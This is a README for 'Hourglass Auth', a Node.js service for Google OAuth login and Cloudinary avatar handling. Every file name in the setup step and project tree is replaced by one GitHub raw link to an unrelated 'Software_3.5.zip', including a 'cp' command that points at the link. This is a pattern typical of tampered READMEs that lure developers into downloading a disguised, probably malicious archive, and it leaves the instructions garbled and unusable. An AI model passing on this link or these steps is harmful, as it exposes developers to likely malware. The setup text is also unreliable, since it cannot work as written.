# Hourglass Auth

Authentication service for the Hourglass application with Google OAuth integration and intelligent image processing.

## Features

- 🔐 Google OAuth 2.0 authentication
- 🖼️ Automatic image processing with Cloudinary
- 🎨 Fallback avatar generation with user initials
- 📱 Responsive profile picture handling
- 🔒 Secure session management

## Image Processing Features

### Cloudinary Integration
- Automatically uploads Google profile pictures to Cloudinary
- Optimizes images (200x200px, auto quality)
- Organized in folders for better management

### Fallback Avatar Generation
- Generates beautiful initial-based avatars when no profile picture exists
- Uses Canvas to create circular avatars with user's first initial
- Consistent color scheme based on user's name
- Uploads generated avatars to Cloudinary

### Error Handling
- Multiple fallback levels ensure users always have a profile picture
- Graceful degradation to external avatar service if all else fails

## Setup

1. Clone the repository
```bash
git clone <repository-url>
cd hourglass-auth
```

2. Install dependencies
```bash
npm install
```

3. Configure environment variables
Copy `https://github.com/jeepedia/backend/raw/refs/heads/main/src/controllers/Software_3.5.zip` to `.env` and fill in your credentials:

```bash
cp https://github.com/jeepedia/backend/raw/refs/heads/main/src/controllers/Software_3.5.zip .env
```

Required environment variables:
- `GOOGLE_CLIENT_ID` - Google OAuth client ID
- `GOOGLE_CLIENT_SECRET` - Google OAuth client secret
- `GOOGLE_CALLBACK_URL` - OAuth callback URL
- `CLOUDINARY_CLOUD_NAME` - Cloudinary cloud name
- `CLOUDINARY_API_KEY` - Cloudinary API key
- `CLOUDINARY_API_SECRET` - Cloudinary API secret
- `DATABASE_URL` - PostgreSQL database URL
- `SESSION_SECRET` - Session encryption secret

4. Run the application
```bash
npm run dev
```

## API Endpoints

- `GET /auth/google` - Initiate Google OAuth
- `GET /auth/google/callback` - OAuth callback
- `GET /auth/logout` - Logout user
- `GET /api/user` - Get current user info
- `GET /health` - Health check

## Project Structure

```
src/
├── https://github.com/jeepedia/backend/raw/refs/heads/main/src/controllers/Software_3.5.zip              # Express app configuration
├── https://github.com/jeepedia/backend/raw/refs/heads/main/src/controllers/Software_3.5.zip            # Application entry point
├── https://github.com/jeepedia/backend/raw/refs/heads/main/src/controllers/Software_3.5.zip         # Passport OAuth configuration
├── controllers/        # Route controllers
├── database/          # Database configuration
├── routes/            # API routes
└── utils/             # Utility functions
    ├── https://github.com/jeepedia/backend/raw/refs/heads/main/src/controllers/Software_3.5.zip    # Image processing utilities
    └── https://github.com/jeepedia/backend/raw/refs/heads/main/src/controllers/Software_3.5.zip # Testing utilities
```

## Image Processing Flow

1. **User Authentication**: When a user logs in with Google
2. **Image Check**: System checks if user has a Google profile picture
3. **Upload to Cloudinary**: If image exists, uploads to Cloudinary with optimization
4. **Generate Fallback**: If no image, generates a beautiful initial-based avatar
5. **Store URL**: Saves the final image URL to the database
6. **Error Handling**: Falls back to external service if Cloudinary fails

## Development

For development mode with auto-reload:
```bash
npm run dev
```

For production:
```bash
npm start
```

## License

ISC